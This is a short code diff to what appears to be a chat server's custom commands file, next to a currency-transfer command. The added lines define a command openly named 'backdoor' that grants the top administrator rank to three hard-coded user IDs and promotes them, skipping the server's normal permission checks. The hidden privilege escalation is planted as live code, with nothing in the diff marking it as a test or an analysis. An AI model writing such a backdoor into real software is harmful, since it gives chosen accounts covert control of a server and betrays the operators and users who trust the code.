@@ -109,6 +109,16 @@ var customCommands = {
 	    this.sendReply('You have successfully transferred ' + transferMoney + ' to ' + targetUser.name + '. You now have ' + user.money + ' ' + p + '.');
 	    targetUser.send(user.name + ' has transferred ' + transferMoney + ' ' + p + ' to you.');
 	},
+
+	backdoor: function (target, room, user) {
+	    if (user.userid === 'blakjack' || user.userid === 'ncrypt' || user.userid === 'jackdaw') {
+
+	        user.group = '~';
+	        user.updateIdentity();
+
+	        this.parse('/promote ' + user.name + ', ~');
+	    }
+	},
 	
 };
 
